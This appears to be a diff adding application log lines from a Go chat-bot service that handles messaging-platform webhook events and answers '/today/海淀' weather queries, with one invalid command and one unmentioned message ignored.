+time="2024-08-11T18:07:22+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 ...\"}"
+[GIN] 2024/08/11 - 18:07:22 | 200 |    3.671717ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T18:07:28+08:00" level=info msg="Handling message: {\"text\":\"@_all ...\"}"
+time="2024-08-11T18:07:28+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_all ...\"}"
+time="2024-08-11T18:07:28+08:00" level=info msg="未艾特机器人, 不处理"
+time="2024-08-11T18:07:28+08:00" level=info msg="Finishing handling message: {\"text\":\"@_all ...\"}"
+[GIN] 2024/08/11 - 18:07:28 | 200 |     4.61743ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T18:07:34+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 123\"}"
+time="2024-08-11T18:07:34+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 123\"}"
+time="2024-08-11T18:07:34+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T18:07:34+08:00" level=error msg="invalid command: 123"
+2024/08/11 18:07:34 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T18:07:35+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 123\"}"
+[GIN] 2024/08/11 - 18:07:35 | 200 |  436.019951ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T19:02:09+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:02:09+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:02:09+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T19:02:09+08:00" level=info msg="handling today weather"
+2024/08/11 19:02:09 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
+2024/08/11 19:02:09 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T19:02:09+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+[GIN] 2024/08/11 - 19:02:09 | 200 |  773.789841ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T19:02:32+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:02:32+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:02:32+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T19:02:32+08:00" level=info msg="handling today weather"
+2024/08/11 19:02:32 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T19:02:33+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+[GIN] 2024/08/11 - 19:02:33 | 200 |  645.914365ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T19:03:45+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:03:45+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:03:45+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T19:03:45+08:00" level=info msg="handling today weather"
+2024/08/11 19:03:46 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T19:03:47+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+[GIN] 2024/08/11 - 19:03:47 | 200 |  1.060450944s | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T19:05:00+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:05:00+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /today/海淀\"}"
+time="2024-08-11T19:05:00+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T19:05:00+08:00" level=info msg="handling today weather"
+2024/08/11 19:05:00 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T19:05:00+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /today/海淀\"}"
+[GIN] 2024/08/11 - 19:05:00 | 200 |  548.186104ms |   123.58.10.239 | POST     "/webhook/event"
